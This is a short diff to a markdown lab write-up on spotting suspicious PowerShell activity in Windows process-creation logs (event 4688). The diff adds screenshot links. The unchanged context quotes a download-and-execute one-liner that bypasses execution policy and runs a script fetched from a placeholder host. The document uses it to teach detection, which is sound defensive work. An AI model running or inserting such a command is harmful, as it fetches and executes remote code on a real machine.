@@ -60,7 +60,7 @@ The command resulted in an error:
 - The URL (`example.com`) returned HTML instead of a PowerShell script
 - PowerShell attempted to execute it anyway
 - This caused a **ParserError**
-
+![Powershell](./images/powershelladmin.png)
 ---
 
 ## 🧠 Key Learning
@@ -107,7 +107,8 @@ C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
 ```
 powershell.exe -ExecutionPolicy Bypass -NoProfile -Command "IEX(New-Object Net.WebClient).DownloadString('http://example.com')"
 ```
-
+![Event Viewer](./images/4688.png)
+![Event Viewer](./images/4688evwr.png)
 ---
 
 ## 🚨 Why This Is Suspicious
@@ -163,4 +164,4 @@ Monitoring process creation logs and command-line activity is critical for detec
 ---
 
 
----
+
